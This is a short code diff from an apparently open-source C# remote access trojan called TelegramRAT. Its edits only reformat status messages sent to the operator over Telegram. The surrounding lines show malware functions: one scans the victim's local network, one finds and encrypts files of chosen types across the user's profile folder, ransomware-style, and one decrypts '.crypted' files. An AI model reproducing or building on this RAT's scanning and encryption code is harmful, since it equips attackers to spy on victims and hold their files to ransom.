@@ -322,12 +322,12 @@ namespace TelegramRAT
         // Scan wlan
         public static void NetDiscover(int to)
         {
-            telegram.sendText("📡 Scanning local network. From 1 to " + to + " hosts.");
+            telegram.sendText($"📡 Scanning local network. From 1 to {to} hosts.");
             string gateway = "";
             try { gateway = GetDefaultGateway().ToString(); }
             catch (NullReferenceException)
             {
-                telegram.sendText("🔌 Not connected to WIFI network.");
+                telegram.sendText("🔌 Not connected to WI-FI network.");
                 return;
             }
             byte[] macAddr = new byte[6];
@@ -975,7 +975,7 @@ namespace TelegramRAT
                 if(config.EncryptionFileTypes.Contains(Path.GetExtension(file)))
                     encFiles.Add(Path.GetFullPath(file));
             }
-            telegram.sendText("🔒 " + encFiles.Count + " files will be encrypted");
+            telegram.sendText($"🔒 {encFiles.Count} files will be encrypted");
             // Encrypt
             foreach (string file in encFiles)
             {
@@ -990,7 +990,7 @@ namespace TelegramRAT
             // Find
             string encryptDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             var files = GetFiles(encryptDir, "*.crypted", SearchOption.AllDirectories);
-            telegram.sendText("🔓 " + files.Count() + " files will be decrypted");
+            telegram.sendText($"🔓 {files.Count()} files will be decrypted");
             // Decrypt
             foreach (string file in files)
             {
